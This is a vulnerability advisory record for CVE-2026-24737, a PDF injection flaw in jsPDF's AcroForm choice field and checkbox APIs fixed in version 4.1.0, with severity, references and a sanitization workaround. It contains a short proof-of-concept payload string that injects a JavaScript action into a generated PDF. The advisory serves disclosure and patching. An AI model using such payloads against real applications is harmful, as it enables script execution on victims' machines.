advisory_id: GHSA-pqxr-3g65-p328
datasource_id: github_osv_importer_v2/GHSA-pqxr-3g65-p328
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-pqxr-3g65-p328/GHSA-pqxr-3g65-p328.json
aliases:
  - CVE-2026-24737
summary: |
  jsPDF has PDF Injection in AcroFormChoiceField that allows Arbitrary JavaScript Execution
  ### Impact

  User control of properties and methods of the Acroform module allows users to inject arbitrary PDF objects, such as JavaScript actions.

  If given the possibility to pass unsanitized input to one of the following methods or properties, a user can inject arbitrary PDF objects, such as JavaScript actions, which are executed when the victim opens the document. The vulnerable API members are:

  * `AcroformChoiceField.addOption`
  * `AcroformChoiceField.setOptions`
  * `AcroFormCheckBox.appearanceState`
  * `AcroFormRadioButton.appearanceState`

  Example attack vector:

  ```js
  import { jsPDF } from "jspdf"
  const doc = new jsPDF();

  var choiceField = new doc.AcroFormChoiceField();
  choiceField.T = "VulnerableField";
  choiceField.x = 20;
  choiceField.y = 20;
  choiceField.width = 100;
  choiceField.height = 20;

  // PAYLOAD:
  // 1. Starts with "/" to bypass escaping.
  // 2. "dummy]" closes the array.
  // 3. "/AA" injects an Additional Action (Focus event).
  // 4. "/JS" executes arbitrary JavaScript.
  const payload = "/dummy] /AA << /Fo << /S /JavaScript /JS (app.alert('XSS')) >> >> /Garbage [";

  choiceField.addOption(payload);
  doc.addField(choiceField);

  doc.save("test.pdf");
  ```

  ### Patches

  The vulnerability has been fixed in jsPDF@4.1.0.

  ### Workarounds
  Sanitize user input before passing it to the vulnerable API members.

  ### Credits
  Research and fix: Ahmet Artu√ß
impacted_packages:
  - purl: pkg:npm/jspdf
    affected_versions: vers:npm/<=4.0.0
    fixed_versions: vers:npm/4.1.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '8.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-pqxr-3g65-p328/GHSA-pqxr-3g65-p328.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-116
references:
  - url: https://github.com/parallax/jsPDF
    reference_type:
    reference_id:
  - url: https://github.com/parallax/jsPDF/commit/da291a5f01b96282545c9391996702cdb8879f79
    reference_type:
    reference_id:
  - url: https://github.com/parallax/jsPDF/releases/tag/v4.1.0
    reference_type:
    reference_id:
  - url: https://github.com/parallax/jsPDF/security/advisories/GHSA-pqxr-3g65-p328
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-24737
    reference_type:
    reference_id:
